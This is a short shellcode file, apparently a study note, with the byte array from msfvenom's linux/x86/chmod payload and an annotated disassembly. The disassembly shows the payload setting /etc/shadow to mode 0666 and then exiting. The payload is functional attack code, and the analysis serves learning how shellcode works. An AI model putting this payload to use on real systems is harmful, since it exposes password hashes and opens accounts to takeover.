//msfvenom -p linux/x86/chmod -f c


unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";



/*
00000000  99                cdq			;copies sign bit of eax into every bit of edx
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16		
0000000A  2F                das			;/etc/shadow
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx		;puts [/etc/shadow] top of stack to ebx
00000017  68B6010000        push dword 0x1b6	
0000001C  59                pop ecx		;puts chmod mode to ecx
0000001D  CD80              int 0x80	;syscall chmod(const char *path, mode_t mode) {chmod(%ebx,%ecx)}
0000001F  6A01              push byte +0x1	
00000021  58                pop eax
00000022  CD80              int 0x80	;exit gracefuly by exit syscall

*/
